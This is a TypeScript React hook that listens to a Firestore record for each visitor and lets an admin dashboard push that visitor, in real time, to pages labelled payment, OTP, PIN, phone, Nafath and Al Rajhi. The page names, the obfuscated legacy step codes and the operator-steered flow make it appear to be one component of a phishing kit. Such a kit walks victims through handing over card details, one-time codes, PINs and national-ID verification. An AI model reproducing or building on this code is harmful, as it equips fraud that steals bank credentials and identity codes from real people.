/**
 * Hook to monitor redirect requests from admin dashboard
 * Checks Firebase for redirectPage field and navigates accordingly
 */

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import { clearRedirectPage } from "@/lib/visitor-tracking";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

export function useRedirectMonitor({
  visitorId,
  currentPage,
}: UseRedirectMonitorProps) {
  const router = useRouter();

  useEffect(() => {
    if (!visitorId || !db) return;

    // Listen to real-time changes in visitor document
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      async (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          const redirectPage = data.redirectPage;
          const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined
          const currentStep = data.currentStep
          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
          const now = Date.now()

          // Modern system: Check redirectPage field
          if (redirectPage && redirectPage !== currentPage) {
            // Check if this is a NEW redirect (within 3 seconds)
            if (!redirectUpdatedAt || (now - redirectUpdatedAt > 3000)) {
              console.log('[useRedirectMonitor] Stale redirect, ignoring')
              return
            }
            
            console.log(
              `[useRedirectMonitor] Redirecting from ${currentPage} to ${redirectPage}`
            );

            // Mark as processed by updating timestamp
            await setDoc(doc(db as Firestore, "pays", visitorId), {
              redirectPageUpdatedAt: now
            }, { merge: true })

            // Clear the redirect flag
            await clearRedirectPage(visitorId);

            // Navigate to the requested page
            const pageMap: Record<string, string> = {
              home: "/home-new",
              insur: "/insur",
              compar: "/compar",
              check: "/check",
              payment: "/check",
              otp: "/step2",
              pin: "/step3",
              phone: "/step5",
              nafad: "/step4",
              rajhi: "/step6",
            };

            const targetUrl = pageMap[redirectPage] || "/";
            router.push(targetUrl);
          }

          // Legacy system: Check currentStep field for phone and nafad
          else if (currentStep) {
            // Check if this is a NEW redirect (within 3 seconds)
            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
              console.log('[useRedirectMonitor] Stale currentStep redirect, ignoring')
              return
            }
            
            const legacyPageMap: Record<string, { page: string; url: string }> =
              {
                home: { page: "home", url: "/home-new" },
                phone: { page: "phone", url: "/step5" },
                rajhi: { page: "rajhi", url: "/step6" },
                _t6: { page: "nafad", url: "/step4" },
                _st1: { page: "check", url: "/check" },
                _t2: { page: "veri", url: "/step2" },
                _t3: { page: "confi", url: "/step3" },
              };

            const targetPage = legacyPageMap[currentStep as string];
            if (targetPage && targetPage.page !== currentPage) {
              console.log(
                `[useRedirectMonitor] Legacy redirect from ${currentPage} to ${targetPage.page}`
              );
              router.push(targetPage.url);
            }
          }
        }
      },
      (error) => {
        console.error("Error monitoring redirect:", error);
      }
    );

    // Cleanup subscription on unmount
    return () => unsubscribe();
  }, [visitorId, currentPage, router]);
}
